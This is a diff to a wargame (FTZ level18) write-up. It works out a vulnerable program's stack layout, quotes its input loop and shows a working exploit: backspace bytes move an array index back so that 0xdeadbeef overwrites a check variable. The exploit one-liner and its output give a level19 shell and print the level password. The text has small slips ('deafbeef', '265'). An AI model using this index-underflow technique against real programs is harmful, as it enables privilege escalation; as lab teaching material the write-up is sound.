@@ -109,7 +109,44 @@ As above, total size(x100) means 256 bytes.
 &check  - &x     = 0xbfffefdc - 0xbfffefd8 = 0x4 (4bytes)   
 &x      - &count = 0xbfffefd8 - 0xbfffefd4 = 0x4 (4bytes)   
 &count  - &fds   = 0xbfffefd4 - 0xbfffef50 = 0x84(132bytes)   
-dummy1 = 132bytes - 128bytes   
+dummy1 = 132bytes - 128bytes = 4bytes   
 dummy2 = 265 - ( 128 + 4 + 4 + 4 + 100 ) = 16bytes - 4bytes(SFP) = 12bytes
 
-fds(128bytes) + dummy1(4bytes) + count(4bytes) + x(4bytes) + string(100bytes) + dummy2(12bytes) + SFP(4bytes) + RET(4bytes)
+fds(128bytes) + dummy1(4bytes) + count(4bytes) + x(4bytes) + check(4bytes) + string(100bytes) + dummy2(12bytes) + SFP(4bytes) + RET(4bytes)
+
+```
+if(FD_ISSET(fileno(stdin),&fds))
+{
+  read(fileno(stdin),&x,1);
+  switch(x)
+  {
+    case '\r':
+    case '\n':
+      printf("\a");
+      break;
+    case 0x08:
+    count--;
+    printf("\b \b");
+    break;
+    default:
+      string[count] = x;
+      count++;
+      break;
+  }
+}
+```
+The point is that you need to input deadbeef in the check.
+
+In the hint, I understood string[count] will be --count if input is 0x08.
+
+So, I will move string[]'s pointer and then input deafbeef in the check.
+
+```
+[level18@ftz level18]$ (python -c 'print "\x08\x08\x08\x08"+"\xef\xbe\xad\xde"'; cat) | ./attackme
+Enter your command:
+id
+uid=3099(level19) gid=3098(level18) groups=3098(level18)
+
+my-pass
+Level19 Password is "swimming in pink".
+```
